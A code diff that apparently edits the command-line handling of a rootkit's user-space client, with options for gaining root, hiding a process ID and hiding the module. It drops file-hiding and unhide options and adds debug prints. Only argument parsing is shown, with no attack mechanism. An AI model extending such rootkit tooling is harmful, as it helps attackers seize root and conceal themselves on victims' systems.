@@ -39,10 +39,7 @@ void print_help(char **argv)
         "  --help                  Print this help message.\n", argv[0]);
 }
 
-void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
-                                   int *unhide_pid, char **pid, int *hide_file,
-                                   int *unhide_file, char **file, int *hide,
-                                   int *unhide, int *protect, int *unprotect)
+void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,char **pid, int *hide)
 {
     if (argc < 2) {
         fprintf(stderr, "Error: No arguments provided.\n\n");
@@ -62,7 +59,6 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     *root = 0;
     *hide_pid = 0;
     *pid = NULL;
-    *file = NULL;
     *hide = 0;
 
 
@@ -74,16 +70,19 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
 
             case 'a':
                 *root = 1;
+                fprintf(stderr, "root\n");
                 break;
 
             case 'b':
                 *hide_pid = 1;
                 *pid = optarg;
+                fprintf(stderr, "hide_pid\n");
                 break;
 
 
             case 'f':
                 *hide = 1;
+                fprintf(stderr, "hide");
                 break;
 
             case 'h':
@@ -102,8 +101,7 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
         }
     }
 
-    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
-            + *unhide + *protect + *unprotect) != 1) {
+    if ((*root + *hide_pid + *hide) != 1) {
         fprintf(stderr, "Error: Exactly one option should be specified\n\n");
         print_help(argv);
         exit(1);
@@ -120,19 +118,13 @@ int main(int argc, char **argv)
 {
     int root;
     int hide_pid;
-    int unhide_pid;
     char *pid;
-    int hide_file;
-    int unhide_file;
-    char *file;
     int hide;
     int unhide;
     int protect;
     int unprotect;
 
-    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
-                                  &hide_file, &unhide_file, &file, &hide, &unhide,
-                                  &protect, &unprotect);
+    handle_command_line_arguments(argc, argv, &root, &hide_pid, &pid,&hide);
 
     size_t buf_size = 0;
 
